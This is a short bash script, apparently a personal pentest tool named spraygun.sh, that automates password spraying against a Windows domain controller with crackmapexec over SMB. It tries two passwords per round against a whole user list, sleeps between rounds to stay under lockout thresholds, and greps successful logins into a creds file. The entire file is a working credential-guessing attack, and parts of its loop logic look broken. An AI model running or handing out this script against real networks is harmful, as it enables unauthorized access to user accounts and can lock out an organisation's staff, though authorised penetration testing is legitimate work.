#!/bin/bash

#usage : ./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins (2x per sleep) 

#script to auto-spray with cme
# going to add failsafe for account lockouts to wait for user confirmation before spraying the network and locking out all the users

# $1 - dc-ip
# $2 - user list
# $3 - password list
# $4 - sleep timer
# $5 - outlog file (not yet)


#check for args
if [ $# -ne 4 ]; then
	echo 'Usage: spraygun.sh dc-ip users-list pass-list sleep-time-in-mins (default 2x per time)'
	exit -1
fi


#alias crackmapexec="cd /opt/CrackMapExec && poetry run crackmapexec"
#trying to put this into /usr/local/bin doesn't work because I suck :(
#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
sleep_timer="sleep $4m"

touch creds.txt 
touch used-passwords.txt
touch tmp-creds.txt
touch passwords-in-queue.txt


count=$(wc -l < $3)

while [ $count -gt 0 ]; do
	echo "Starting password spray with 2x every $4"
	
	head -n $count $3 > passwords-in-queue.txt
	
	for pass in $(cat passwords-in-queue.txt | head -2); do
		echo "Spraying: $pass"
		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log spraygun-log.log
		echo $pass >> /root/Documents/sprays/used-passwords.txt

		sleep 5

	done
	
	echo "Found creds: "
	cat spraygun-log.log | grep -ai '[+]' | tee -a tmp-creds.txt
 	sort -u tmp-creds.txt >> creds.txt 

  	#echo "Found creds: "
	#cat spraygun-log.log | grep -ai '\[+\]' >> tmp-creds.txt
 	#sort -u tmp-creds.txt | cut -d "\\" -f 2 >> creds.txt 
  	#cat creds.txt
	
	sed -i "1,2d" passwords-in-queue.txt
	
	count=$(wc -l < passwords-in-queue.txt)
	echo "sleeping for $4m"
	$sleep_timer
done

echo "End of file, check your creds!"

#add locked-out accounts finding
#add on screen timer for sprays
